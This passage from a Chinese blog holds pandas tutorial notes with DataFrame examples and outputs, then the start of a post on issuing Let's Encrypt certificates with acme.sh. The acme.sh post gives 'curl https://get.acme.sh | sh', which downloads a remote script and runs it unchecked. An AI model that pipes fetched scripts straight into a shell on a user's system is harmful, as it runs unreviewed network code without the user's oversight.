pd.DataFrame(np.random.randn(8, 4), columns=['A','B','C','D']) df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 0 -2.727829 -1.382168 0.961920 0.083472 1 -0.297131 -0.294723 0.303267 -0.539177 2 -0.226735 -2.157170 1.559418 0.102023 3 0.569927 -0.800855 0.918515 1.630873 4 0.402999 -2.238052 2.181635 1.950669 5 1.238971 -0.165159 0.688200 0.793499 6 1.356265 -0.034859 -0.020774 0.485487 7 -1.793398 0.900625 0.365789 -2.089145 s = df.iloc[3] df.append(s, ignore_index=True) # 忽略 index .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 0 -2.727829 -1.382168 0.961920 0.083472 1 -0.297131 -0.294723 0.303267 -0.539177 2 -0.226735 -2.157170 1.559418 0.102023 3 0.569927 -0.800855 0.918515 1.630873 4 0.402999 -2.238052 2.181635 1.950669 5 1.238971 -0.165159 0.688200 0.793499 6 1.356265 -0.034859 -0.020774 0.485487 7 -1.793398 0.900625 0.365789 -2.089145 8 0.569927 -0.800855 0.918515 1.630873 s = df.iloc[4] df.append(s, ignore_index=False) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 0 -2.727829 -1.382168 0.961920 0.083472 1 -0.297131 -0.294723 0.303267 -0.539177 2 -0.226735 -2.157170 1.559418 0.102023 3 0.569927 -0.800855 0.918515 1.630873 4 0.402999 -2.238052 2.181635 1.950669 5 1.238971 -0.165159 0.688200 0.793499 6 1.356265 -0.034859 -0.020774 0.485487 7 -1.793398 0.900625 0.365789 -2.089145 4 0.402999 -2.238052 2.181635 1.950669 0x09 分组 Grouping对于分组(group by)，通常有下面几个操作步骤： Splitting 按照一些规则将数据分为不同的组 Applying 对于每组数据分别执行一个函数 Combining 将结果组合到一个数据结构中 df = pd.DataFrame({'A' : ['foo', 'bar', 'foo', 'bar', 'foo', 'bar', 'foo', 'foo'], 'B' : ['one', 'one', 'two', 'three', 'two', 'two', 'one', 'three'], 'C' : np.random.randn(8), 'D' : np.random.randn(8)}) df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 0 foo one 1.038586 2.040014 1 bar one 0.454452 -0.553457 2 foo two -0.730273 -0.207136 3 bar three 0.435136 0.443462 4 foo two 2.557988 -1.831259 5 bar two 1.131084 0.915332 6 foo one 1.078171 0.037355 7 foo three 2.057203 1.209778 分组并对得到的分组执行sum函数。 df.groupby('A').sum() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; C D A bar -1.001520 1.880284 foo 1.365107 1.459170 通过多个列进行分组形成一个层次(hierarchical)索引，然后执行函数。 df.groupby(['A','B']).sum() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; C D A B bar one 0.598883 1.667737 three -0.605689 -0.531403 two -0.994715 0.743951 foo one -0.090250 0.694644 three 0.738067 1.498865 two 0.717290 -0.734339 0x0A 重塑/改变形状 Reshaping0x0A-1 Stacktuples = list(zip(*[['bar', 'bar', 'baz', 'baz', 'foo', 'foo', 'qux', 'qux'], ['one', 'two', 'one', 'two', 'one', 'two', 'one', 'two']])) tuples [('bar', 'one'), ('bar', 'two'), ('baz', 'one'), ('baz', 'two'), ('foo', 'one'), ('foo', 'two'), ('qux', 'one'), ('qux', 'two')] index = pd.MultiIndex.from_tuples(tuples, names=['first', 'second']) df = pd.DataFrame(np.random.randn(8, 2), index=index, columns=['A', 'B']) df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B first second bar one 1.402402 -0.215913 two -0.305333 -0.679614 baz one 0.745205 0.872718 two 0.421718 -0.662528 foo one -1.433628 0.627898 two 2.129267 -0.260206 qux one 0.498752 -0.622814 two -0.356492 1.364184 df2 = df[:4] df2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B first second bar one 1.402402 -0.215913 two -0.305333 -0.679614 baz one 0.745205 0.872718 two 0.421718 -0.662528 stack()方法在 DataFrame 列的层次上进行压缩 stacked = df2.stack() stacked first second bar one A 1.402402 B -0.215913 two A -0.305333 B -0.679614 baz one A 0.745205 B 0.872718 two A 0.421718 B -0.662528 dtype: float64 对于一个经过了 stack 的 DataFrame 或者 Series（以 MultiIndex 作为索引），stack()的逆运算是isunstack()，默认情况下是 unstack 最后一层。 就是说，bar、baz是第0级，one、two是第1级，A、B是第2级。 stacked.unstack() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B first second bar one 1.402402 -0.215913 two -0.305333 -0.679614 baz one 0.745205 0.872718 two 0.421718 -0.662528 stacked.unstack(1) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; second one two first bar A 1.402402 -0.305333 B -0.215913 -0.679614 baz A 0.745205 0.421718 B 0.872718 -0.662528 stacked.unstack(0) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; first bar baz second one A 1.402402 0.745205 B -0.215913 0.872718 two A -0.305333 0.421718 B -0.679614 -0.662528 0x0A-2 数据透视表 Pivot Tablesdf = pd.DataFrame({'A' : ['one', 'one', 'two', 'three'] * 3, 'B' : ['A', 'B', 'C'] * 4, 'C' : ['foo', 'foo', 'foo', 'bar', 'bar', 'bar'] * 2, 'D' : np.random.randn(12), 'E' : np.random.randn(12)}) df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D E 0 one A foo 0.072696 0.305015 1 one B foo 1.428383 -1.108178 2 two C foo 1.239483 0.001580 3 three A bar -0.953547 1.061740 4 one B bar 0.762730 1.161542 5 one C bar -0.372740 -0.480251 6 two A foo 0.765181 -1.034218 7 three B foo -1.858334 0.359220 8 one C foo -0.952807 1.067494 9 one A bar 0.541013 -0.280833 10 two B bar -1.810560 -0.829793 11 three C bar -1.049108 -0.295998 pd.pivot_table(df, values='D', index=['A', 'B'], columns=['C']) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; C bar foo A B one A 0.541013 0.072696 B 0.762730 1.428383 C -0.372740 -0.952807 three A -0.953547 NaN B NaN -1.858334 C -1.049108 NaN two A NaN 0.765181 B -1.810560 NaN C NaN 1.239483 0x0B 时间序列 Time SeriesPandas 在对频率转换进行重新采样时拥有简单、强大且高效的功能（如将按秒采样的数据转换为按5分钟为单位进行采样的数据）。这种操作在金融领域非常常见，但不局限于此。 哇，原来还可以这样玩唉（ 这个在信号处理里面也很常用的呢！ rng = pd.date_range('1/1/2020', periods=200, freq='S') ts = pd.Series(np.random.randint(0, 500, len(rng)), index=rng) ts.resample('1Min').sum() 2020-01-01 00:00:00 13244 2020-01-01 00:01:00 14799 2020-01-01 00:02:00 15489 2020-01-01 00:03:00 3894 Freq: T, dtype: int32 时区表示rng = pd.date_range('4/16/2020 00:00', periods=5, freq='D') ts = pd.Series(np.random.randn(len(rng)), rng) ts 2020-04-16 0.872043 2020-04-17 -0.305200 2020-04-18 1.681828 2020-04-19 0.163184 2020-04-20 1.415422 Freq: D, dtype: float64 ts_utc = ts.tz_localize('UTC') ts_utc 2020-04-16 00:00:00+00:00 0.872043 2020-04-17 00:00:00+00:00 -0.305200 2020-04-18 00:00:00+00:00 1.681828 2020-04-19 00:00:00+00:00 0.163184 2020-04-20 00:00:00+00:00 1.415422 Freq: D, dtype: float64 转换到另外一个时区ts_utc.tz_convert('Asia/Shanghai') 2020-04-16 08:00:00+08:00 0.872043 2020-04-17 08:00:00+08:00 -0.305200 2020-04-18 08:00:00+08:00 1.681828 2020-04-19 08:00:00+08:00 0.163184 2020-04-20 08:00:00+08:00 1.415422 Freq: D, dtype: float64 时间跨度转换rng = pd.date_range('1/1/2020', periods=5, freq='M') ts = pd.Series(np.random.randn(len(rng)), index=rng) ts 2020-01-31 0.259847 2020-02-29 -0.092969 2020-03-31 0.525985 2020-04-30 0.090362 2020-05-31 1.707569 Freq: M, dtype: float64 ps = ts.to_period() ps 2020-01 0.259847 2020-02 -0.092969 2020-03 0.525985 2020-04 0.090362 2020-05 1.707569 Freq: M, dtype: float64 ps.to_timestamp() 2020-01-01 0.259847 2020-02-01 -0.092969 2020-03-01 0.525985 2020-04-01 0.090362 2020-05-01 1.707569 Freq: MS, dtype: float64 时期和时间戳之间的转换使得可以使用一些方便的算术函数。 下面这个例子，转换一个每年以11月结束的季度频率为 季度结束后的月末的上午9点。（有点懵 prng = pd.period_range('1990Q1', '2000Q4', freq='Q-NOV') ts = pd.Series(np.random.randn(len(prng)), prng) ts.index = (prng.asfreq('M', 'e') + 1).asfreq('H', 's') + 9 ts.head() 1990-03-01 09:00 -1.287411 1990-06-01 09:00 1.744485 1990-09-01 09:00 0.336561 1990-12-01 09:00 -1.206576 1991-03-01 09:00 0.108631 Freq: H, dtype: float64 0x0C 类别 Categoricalspandas 可以在 DataFrame 中支持 category 类型的数据。 df = pd.DataFrame({\"id\":[1,2,3,4,5,6], \"raw_grade\":['a', 'b', 'b', 'a', 'a', 'e']}) 将 raw grades 转换为 category 数据类型。 df[\"grade\"] = df[\"raw_grade\"].astype(\"category\") df[\"grade\"] 0 a 1 b 2 b 3 a 4 a 5 e Name: grade, dtype: category Categories (3, object): [a, b, e] 将 category 类型数据重命名为更有意义的名称，利用Series.cat.categories方法。 df[\"grade\"].cat.categories = [\"very good\", \"good\", \"very bad\"] df[\"grade\"] 0 very good 1 good 2 good 3 very good 4 very good 5 very bad Name: grade, dtype: category Categories (3, object): [very good, good, very bad] 对类别进行重新排序，同时增加缺失的类别。 Series.cat下的方法默认返回一个新的序列。 df[\"grade\"] = df[\"grade\"].cat.set_categories([\"very bad\", \"bad\", \"medium\", \"good\", \"very good\"]) df[\"grade\"] 0 very good 1 good 2 good 3 very good 4 very good 5 very bad Name: grade, dtype: category Categories (5, object): [very bad, bad, medium, good, very good] 排序是按照 category 的顺序进行的，而不是按照词汇顺序(lexical order)。 df.sort_values(by=\"grade\") .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; id raw_grade grade 5 6 e very bad 1 2 b good 2 3 b good 0 1 a very good 3 4 a very good 4 5 a very good 对一个 Category 类型的列进行分组时显示了空的类别。 df.groupby(\"grade\").size() grade very bad 1 bad 0 medium 0 good 2 very good 3 dtype: int64 0x0D 作图 Plottingts = pd.Series(np.random.randn(1000), index=pd.date_range('1/1/2020', periods=1000)) ts = ts.cumsum() ts.plot() &lt;matplotlib.axes._subplots.AxesSubplot at 0x250ccebcb70&gt; 对于 DataFrame 而言，plot()方法是一种将所有带有标签的列进行绘制的简便方法。 df = pd.DataFrame(np.random.randn(1000, 4), index=ts.index, columns=['A', 'B', 'C', 'D']) # print(df) df = df.cumsum() plt.figure() df.plot() plt.legend(loc='best') &lt;matplotlib.legend.Legend at 0x250ce7620b8&gt; &lt;Figure size 432x288 with 0 Axes&gt; ts.index DatetimeIndex(['2020-01-01', '2020-01-02', '2020-01-03', '2020-01-04', '2020-01-05', '2020-01-06', '2020-01-07', '2020-01-08', '2020-01-09', '2020-01-10', ... '2022-09-17', '2022-09-18', '2022-09-19', '2022-09-20', '2022-09-21', '2022-09-22', '2022-09-23', '2022-09-24', '2022-09-25', '2022-09-26'], dtype='datetime64[ns]', length=1000, freq='D') 0x0E 导入导出数据 Getting Data In/Out0x0E-1 CSV写入 csv 文件 df.to_csv('foo.csv') # 保存在当前目录下 从 csv 文件中导入数据 pd.read_csv('foo.csv') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; Unnamed: 0 A B C D 0 2020-01-01 -1.397481 -0.453722 1.374079 -2.095767 1 2020-01-02 -1.363418 0.529293 0.178497 -2.364989 2 2020-01-03 -2.047267 -0.333020 0.379978 -2.628204 3 2020-01-04 -2.305870 -0.145598 -0.232491 -2.812290 4 2020-01-05 -1.851390 -1.378215 -1.202399 -4.574516 5 2020-01-06 -3.438928 -0.779975 -1.864979 -5.666847 6 2020-01-07 -4.201270 -0.827366 -0.796513 -5.267628 7 2020-01-08 -5.682762 -1.009404 -0.760801 -4.696243 8 2020-01-09 -4.362126 -0.768552 -0.747517 -5.562345 9 2020-01-10 -5.226357 -1.791920 0.290504 -5.214061 10 2020-01-11 -4.429691 -2.026951 -0.821212 -6.621030 11 2020-01-12 -4.222744 -2.875169 -0.654313 -5.926621 12 2020-01-13 -2.413314 -3.329878 -1.595397 -5.585677 13 2020-01-14 -2.769944 -3.536045 -1.463671 -5.098753 14 2020-01-15 -3.599683 -4.973067 -3.859425 -5.823875 15 2020-01-16 -3.486154 -4.792330 -2.866047 -6.312086 16 2020-01-17 -4.232714 -5.082053 -3.572924 -8.478300 17 2020-01-18 -5.346857 -5.787422 -4.313125 -8.595854 18 2020-01-19 -5.720494 -5.620498 -3.699862 -9.678113 19 2020-01-20 -5.264735 -4.938944 -2.354040 -8.942524 20 2020-01-21 -5.407854 -5.379811 -2.284447 -8.068545 21 2020-01-22 -5.793401 -5.501279 -2.254013 -7.997644 22 2020-01-23 -6.796539 -4.692782 -2.330458 -7.449650 23 2020-01-24 -7.502072 -4.085084 -1.810495 -6.540544 24 2020-01-25 -7.639024 -3.791416 1.214301 -7.599166 25 2020-01-26 -7.783544 -2.180918 1.628560 -7.928116 26 2020-01-27 -7.673699 -3.485888 0.640970 -8.124872 27 2020-01-28 -7.435098 -4.480212 -0.409425 -7.943383 28 2020-01-29 -6.843557 -5.069680 -1.650871 -7.311741 29 2020-01-30 -7.647267 -4.115332 -1.558887 -6.308304 ... ... ... ... ... ... 970 2022-08-28 17.157914 -23.306973 -12.461653 -2.478731 971 2022-08-29 18.207251 -23.725280 -12.912440 -2.664828 972 2022-08-30 17.968302 -21.485150 -15.044877 -4.034060 973 2022-08-31 18.933869 -21.587237 -16.046081 -4.014128 974 2022-09-01 18.337284 -21.451739 -15.028398 -4.147177 975 2022-09-02 18.783912 -21.096423 -15.506137 -3.858413 976 2022-09-03 18.828378 -19.514168 -16.924864 -2.559397 977 2022-09-04 18.570511 -21.482747 -17.147155 -4.267082 978 2022-09-05 17.212119 -22.331837 -16.496095 -5.990857 979 2022-09-06 15.726498 -23.219830 -19.321023 -5.281962 980 2022-09-07 16.053999 -22.681168 -19.139536 -5.587482 981 2022-09-08 17.335456 -23.320514 -21.271891 -4.048170 982 2022-09-09 16.925567 -24.175782 -22.318101 -4.890968 983 2022-09-10 18.652048 -25.436089 -22.213175 -6.330027 984 2022-09-11 19.535978 -25.673818 -23.064392 -5.673334 985 2022-09-12 19.632355 -26.369119 -22.953900 -3.463010 986 2022-09-13 18.792587 -25.430236 -23.672206 -2.292810 987 2022-09-14 21.200064 -26.299390 -23.567706 -2.753986 988 2022-09-15 22.890536 -27.813985 -23.938164 -3.195772 989 2022-09-16 23.138447 -25.855344 -24.390078 -3.612660 990 2022-09-17 23.163567 -26.157774 -24.309178 -3.155928 991 2022-09-18 20.973996 -27.319631 -22.948785 -4.487101 992 2022-09-19 21.090756 -26.712847 -21.722990 -4.110810 993 2022-09-20 21.848391 -25.018472 -21.850579 -4.360523 994 2022-09-21 22.898217 -26.005364 -20.914269 -5.357187 995 2022-09-22 21.978310 -25.001244 -20.881626 -5.606849 996 2022-09-23 24.132628 -25.692639 -20.310265 -6.258977 997 2022-09-24 23.777794 -25.485527 -21.305882 -5.330284 998 2022-09-25 25.105611 -25.485135 -22.407657 -6.600228 999 2022-09-26 25.207099 -25.512208 -23.434955 -7.275999 1000 rows × 5 columns 0x0E-2 HDF5写入 HDF5 存储 df.to_hdf('foo.h5','df') 从 HDF5 存储中读取数据 pd.read_hdf('foo.h5','df') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 2020-01-01 -1.397481 -0.453722 1.374079 -2.095767 2020-01-02 -1.363418 0.529293 0.178497 -2.364989 2020-01-03 -2.047267 -0.333020 0.379978 -2.628204 2020-01-04 -2.305870 -0.145598 -0.232491 -2.812290 2020-01-05 -1.851390 -1.378215 -1.202399 -4.574516 2020-01-06 -3.438928 -0.779975 -1.864979 -5.666847 2020-01-07 -4.201270 -0.827366 -0.796513 -5.267628 2020-01-08 -5.682762 -1.009404 -0.760801 -4.696243 2020-01-09 -4.362126 -0.768552 -0.747517 -5.562345 2020-01-10 -5.226357 -1.791920 0.290504 -5.214061 2020-01-11 -4.429691 -2.026951 -0.821212 -6.621030 2020-01-12 -4.222744 -2.875169 -0.654313 -5.926621 2020-01-13 -2.413314 -3.329878 -1.595397 -5.585677 2020-01-14 -2.769944 -3.536045 -1.463671 -5.098753 2020-01-15 -3.599683 -4.973067 -3.859425 -5.823875 2020-01-16 -3.486154 -4.792330 -2.866047 -6.312086 2020-01-17 -4.232714 -5.082053 -3.572924 -8.478300 2020-01-18 -5.346857 -5.787422 -4.313125 -8.595854 2020-01-19 -5.720494 -5.620498 -3.699862 -9.678113 2020-01-20 -5.264735 -4.938944 -2.354040 -8.942524 2020-01-21 -5.407854 -5.379811 -2.284447 -8.068545 2020-01-22 -5.793401 -5.501279 -2.254013 -7.997644 2020-01-23 -6.796539 -4.692782 -2.330458 -7.449650 2020-01-24 -7.502072 -4.085084 -1.810495 -6.540544 2020-01-25 -7.639024 -3.791416 1.214301 -7.599166 2020-01-26 -7.783544 -2.180918 1.628560 -7.928116 2020-01-27 -7.673699 -3.485888 0.640970 -8.124872 2020-01-28 -7.435098 -4.480212 -0.409425 -7.943383 2020-01-29 -6.843557 -5.069680 -1.650871 -7.311741 2020-01-30 -7.647267 -4.115332 -1.558887 -6.308304 ... ... ... ... ... 2022-08-28 17.157914 -23.306973 -12.461653 -2.478731 2022-08-29 18.207251 -23.725280 -12.912440 -2.664828 2022-08-30 17.968302 -21.485150 -15.044877 -4.034060 2022-08-31 18.933869 -21.587237 -16.046081 -4.014128 2022-09-01 18.337284 -21.451739 -15.028398 -4.147177 2022-09-02 18.783912 -21.096423 -15.506137 -3.858413 2022-09-03 18.828378 -19.514168 -16.924864 -2.559397 2022-09-04 18.570511 -21.482747 -17.147155 -4.267082 2022-09-05 17.212119 -22.331837 -16.496095 -5.990857 2022-09-06 15.726498 -23.219830 -19.321023 -5.281962 2022-09-07 16.053999 -22.681168 -19.139536 -5.587482 2022-09-08 17.335456 -23.320514 -21.271891 -4.048170 2022-09-09 16.925567 -24.175782 -22.318101 -4.890968 2022-09-10 18.652048 -25.436089 -22.213175 -6.330027 2022-09-11 19.535978 -25.673818 -23.064392 -5.673334 2022-09-12 19.632355 -26.369119 -22.953900 -3.463010 2022-09-13 18.792587 -25.430236 -23.672206 -2.292810 2022-09-14 21.200064 -26.299390 -23.567706 -2.753986 2022-09-15 22.890536 -27.813985 -23.938164 -3.195772 2022-09-16 23.138447 -25.855344 -24.390078 -3.612660 2022-09-17 23.163567 -26.157774 -24.309178 -3.155928 2022-09-18 20.973996 -27.319631 -22.948785 -4.487101 2022-09-19 21.090756 -26.712847 -21.722990 -4.110810 2022-09-20 21.848391 -25.018472 -21.850579 -4.360523 2022-09-21 22.898217 -26.005364 -20.914269 -5.357187 2022-09-22 21.978310 -25.001244 -20.881626 -5.606849 2022-09-23 24.132628 -25.692639 -20.310265 -6.258977 2022-09-24 23.777794 -25.485527 -21.305882 -5.330284 2022-09-25 25.105611 -25.485135 -22.407657 -6.600228 2022-09-26 25.207099 -25.512208 -23.434955 -7.275999 1000 rows × 4 columns 0x0E-3 Excel看网上说，相对于 xlwt、xlrd 之类的库，用 pandas 来对 excel 进行数据处理和分析挺不错的，正好最近也想试试呢。 写入 Excel df.to_excel('foo.xlsx', sheet_name='Sheet1') 从 excel 中读取数据 pd.read_excel('foo.xlsx', 'Sheet1', index_col=None, na_values=['NA']) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; Unnamed: 0 A B C D 0 2020-01-01 -1.397481 -0.453722 1.374079 -2.095767 1 2020-01-02 -1.363418 0.529293 0.178497 -2.364989 2 2020-01-03 -2.047267 -0.333020 0.379978 -2.628204 3 2020-01-04 -2.305870 -0.145598 -0.232491 -2.812290 4 2020-01-05 -1.851390 -1.378215 -1.202399 -4.574516 5 2020-01-06 -3.438928 -0.779975 -1.864979 -5.666847 6 2020-01-07 -4.201270 -0.827366 -0.796513 -5.267628 7 2020-01-08 -5.682762 -1.009404 -0.760801 -4.696243 8 2020-01-09 -4.362126 -0.768552 -0.747517 -5.562345 9 2020-01-10 -5.226357 -1.791920 0.290504 -5.214061 10 2020-01-11 -4.429691 -2.026951 -0.821212 -6.621030 11 2020-01-12 -4.222744 -2.875169 -0.654313 -5.926621 12 2020-01-13 -2.413314 -3.329878 -1.595397 -5.585677 13 2020-01-14 -2.769944 -3.536045 -1.463671 -5.098753 14 2020-01-15 -3.599683 -4.973067 -3.859425 -5.823875 15 2020-01-16 -3.486154 -4.792330 -2.866047 -6.312086 16 2020-01-17 -4.232714 -5.082053 -3.572924 -8.478300 17 2020-01-18 -5.346857 -5.787422 -4.313125 -8.595854 18 2020-01-19 -5.720494 -5.620498 -3.699862 -9.678113 19 2020-01-20 -5.264735 -4.938944 -2.354040 -8.942524 20 2020-01-21 -5.407854 -5.379811 -2.284447 -8.068545 21 2020-01-22 -5.793401 -5.501279 -2.254013 -7.997644 22 2020-01-23 -6.796539 -4.692782 -2.330458 -7.449650 23 2020-01-24 -7.502072 -4.085084 -1.810495 -6.540544 24 2020-01-25 -7.639024 -3.791416 1.214301 -7.599166 25 2020-01-26 -7.783544 -2.180918 1.628560 -7.928116 26 2020-01-27 -7.673699 -3.485888 0.640970 -8.124872 27 2020-01-28 -7.435098 -4.480212 -0.409425 -7.943383 28 2020-01-29 -6.843557 -5.069680 -1.650871 -7.311741 29 2020-01-30 -7.647267 -4.115332 -1.558887 -6.308304 ... ... ... ... ... ... 970 2022-08-28 17.157914 -23.306973 -12.461653 -2.478731 971 2022-08-29 18.207251 -23.725280 -12.912440 -2.664828 972 2022-08-30 17.968302 -21.485150 -15.044877 -4.034060 973 2022-08-31 18.933869 -21.587237 -16.046081 -4.014128 974 2022-09-01 18.337284 -21.451739 -15.028398 -4.147177 975 2022-09-02 18.783912 -21.096423 -15.506137 -3.858413 976 2022-09-03 18.828378 -19.514168 -16.924864 -2.559397 977 2022-09-04 18.570511 -21.482747 -17.147155 -4.267082 978 2022-09-05 17.212119 -22.331837 -16.496095 -5.990857 979 2022-09-06 15.726498 -23.219830 -19.321023 -5.281962 980 2022-09-07 16.053999 -22.681168 -19.139536 -5.587482 981 2022-09-08 17.335456 -23.320514 -21.271891 -4.048170 982 2022-09-09 16.925567 -24.175782 -22.318101 -4.890968 983 2022-09-10 18.652048 -25.436089 -22.213175 -6.330027 984 2022-09-11 19.535978 -25.673818 -23.064392 -5.673334 985 2022-09-12 19.632355 -26.369119 -22.953900 -3.463010 986 2022-09-13 18.792587 -25.430236 -23.672206 -2.292810 987 2022-09-14 21.200064 -26.299390 -23.567706 -2.753986 988 2022-09-15 22.890536 -27.813985 -23.938164 -3.195772 989 2022-09-16 23.138447 -25.855344 -24.390078 -3.612660 990 2022-09-17 23.163567 -26.157774 -24.309178 -3.155928 991 2022-09-18 20.973996 -27.319631 -22.948785 -4.487101 992 2022-09-19 21.090756 -26.712847 -21.722990 -4.110810 993 2022-09-20 21.848391 -25.018472 -21.850579 -4.360523 994 2022-09-21 22.898217 -26.005364 -20.914269 -5.357187 995 2022-09-22 21.978310 -25.001244 -20.881626 -5.606849 996 2022-09-23 24.132628 -25.692639 -20.310265 -6.258977 997 2022-09-24 23.777794 -25.485527 -21.305882 -5.330284 998 2022-09-25 25.105611 -25.485135 -22.407657 -6.600228 999 2022-09-26 25.207099 -25.512208 -23.434955 -7.275999 1000 rows × 5 columns 0x0F 陷阱 Gotchas如果你在运行中看到例如下面的异常。 if pd.Series([False, True, False]): print(\"I was true\") --------------------------------------------------------------------------- ValueError Traceback (most recent call last) &lt;ipython-input-304-5c782b38cd2f&gt; in &lt;module&gt; ----&gt; 1 if pd.Series([False, True, False]): 2 print(\"I was true\") D:\\Programs\\Anaconda\\lib\\site-packages\\pandas\\core\\generic.py in __nonzero__(self) 1476 raise ValueError(\"The truth value of a {0} is ambiguous. \" 1477 \"Use a.empty, a.bool(), a.item(), a.any() or a.all().\" -&gt; 1478 .format(self.__class__.__name__)) 1479 1480 __bool__ = __nonzero__ ValueError: The truth value of a Series is ambiguous. Use a.empty, a.bool(), a.item(), a.any() or a.all(). 可以参考 Comparisons 这里来寻求解释和下一步的方案。 也可以参考 Comparisons。 （上面都是官方的文档地址） （官方文档到这里就结束了） 0x10 小结关于选取： 选择整行/整列，或多个整行/多个整列的数据，可以用df[]、df.loc[]、df.iloc[]这三种用法。 区域选取，分为标签索引和整数索引 标签索引：df.loc[] 整数索引：df.iloc[] 选取单元格：df.at[]、df.iat[]、df.loc[]、df.iloc[] 都可以，要注意参数。df[]不行！ 关于选取的返回值： 返回值包括单行多列或多行单列时，返回值为 Series 对象 返回值包括多行多列时，返回值为 DataFrame 对象 返回值仅为一个单元格（单行单列）时，返回值为（可能是 numpy 的）基本数据类型，例如 str, float64, int64 等 df[]因为不能精确到单元格，所以返回值一定 DataFrame 或 Series 对象 当使用 DataFrame 的默认索引（整数索引）时，整数索引即为标签索引。 其实 pandas 还有很多有用的 API 这里面还没介绍，后面有空再慢慢了解呢。 做项目的时候看看别人做过的实例，再深入看看相关的 API 好了。 大概就这些内容了吧。 （溜了溜了 20200418 更新： Jupyter Notebook 文档 (.ipynb) 放到 GitHub 上了，详见这里：https://github.com/miaotony/DataScience/blob/master/10_Minutes_to_pandas.ipynb 下载文档的话 戳这里（CDN，推荐） 呢！或者 也可以戳这里（GitHub raw）！ 0xFF References &amp; Extensive Reading官方的 10 Minutes to pandas [python数据分析之pandas数据选取：df] df.loc[] df.iloc[] df.ix[] df.at[] df.iat[] 学习python中的pandas有没有好的教程推荐？ 从Excel到Python：最常用的36个Pandas函数！ etc.","path":"2020/04/17/DataScience_10MinutesToPandas/"},{"title":"基于acme.sh从Let's encrypt生成免费且自动更新的SSL证书","text":"0x00 前言3月26日，一堆 GitHub Pages 以及 jd.com 等网站的 SSL 证书被一个自签名证书 （C=CN; ST=GD; L=SZ; O=COM; OU=NSP; CN=SERVER; emailAddress=346608453@qq.com ）劫持了，开启了 HSTS 则会被浏览器拦下来。不过套了 CF 的 CDN 则不受影响。27日发现 *.github.io 好了，GitHub 主站被劫持了……（真狠啊 具体参考这几篇： https://www.v2ex.com/t/656367https://www.v2ex.com/t/656394https://m.cnbeta.com/view/960295.htm一些网站https证书出现问题的情况分析 （最后这篇说很多大站都受影响了 HTTPS 加密通信挺重要的，之前也听说过 MITM（中间人攻击），不过这还是第一次听说证书被劫持的…… 怎么说好呢，应该可以说网络上不能保证绝对安全吧，或者说绝对安全是不存在的。 想起来之前搭建的一个服务还没上 HTTPS，然而想不起来之前是怎么配置 SSL 证书的了，然后又得去找资料烦死了，于是这回顺便来记录一下好了啦。（摊手 通过 Let’s encrypt 可以获得 90 天免费且可续期的 SSL 证书，而利用 acme.sh 可以自动生成和更新，就来介绍一下配置的过程吧。 当然，你还可以尝试用 Let’s Encrypt 的 certbot 工具来签发证书，不过要装一堆库吧，我也不记得了…… 下面的内容涉及 acme.sh 的安装，证书的签发及认证，如何安装到 nginx，以及自动更新证书、更新 acme.sh 等。 0x01 安装 acme.shcurl https://get.acme.sh | sh 或者 wget -O - https://get.acme.sh | sh 执行上面的命令，它会： 从 GitHub 上下载 sh 脚本并执行 把文件解压到用户的 ~/.acme.sh目录下 给命令行设置一个acme.sh的 alias 别名 最后注册一个 cron 定时任务来自动更新证书。 安装完成后要自行重启命令行，或者重新加载一下.bashrc文件（source ~/.bashrc）。 然后看一下有没有生效。 $ acme.sh -h https://github.com/acmesh-official/acme.sh v2.8.6 Usage: acme.sh command ...[parameters].... Commands: --help, -h Show this help message. --version, -v Show version info. --install Install acme.sh to your system. --uninstall Uninstall acme.sh, and uninstall the cron job. --upgrade Upgrade acme.sh to the latest code from https://github.com/acmesh-official/acme.sh. --issue Issue a cert. --signcsr Issue a cert from an existing csr. --deploy Deploy the cert to your server. --install-cert Install the issued cert to apache/nginx or any other server. # ...... 0x02 签发 SSL 证书签发 SSL 证书需要证明这个域名是属于你的，即域名所有权，一般有两种方式验证：http 和 dns 验证。 通过 acme.sh 可以签发单域名、多域名、泛域名证书，还可以签发 ECC 证书。为了简单起见，这里以单域名证书为例，后面再拓展一下好了。 下面任意一种方式只要安装成功了就行！ 